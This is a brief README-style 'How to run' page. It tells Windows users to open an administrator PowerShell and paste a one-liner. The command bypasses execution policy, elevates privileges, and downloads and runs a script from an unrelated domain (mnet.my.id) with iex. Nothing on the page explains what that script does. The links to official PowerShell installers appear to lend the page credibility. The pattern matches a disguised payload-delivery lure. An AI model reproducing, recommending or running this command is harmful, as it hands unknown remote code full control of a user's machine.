### HOW TO RUN

-   Right-click on the Windows start menu and select PowerShell (Admin).
-   Alternative Download [PowerShellx64.msi](https://github.com/PowerShell/PowerShell/releases/download/v7.4.5/PowerShell-7.4.5-win-x64.msi) or [PowerShellx86.msi](https://github.com/PowerShell/PowerShell/releases/download/v7.4.5/PowerShell-7.4.5-win-x86.msi) and Run As Admin PowerShell 7
-   Copy and paste the code below and press enter
```
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (iwr 'https://mnet.my.id/update/github/c' -UseBasicParsing)`"" -Verb RunAs
```
-  You will see the download.
-  That's all.

</br>
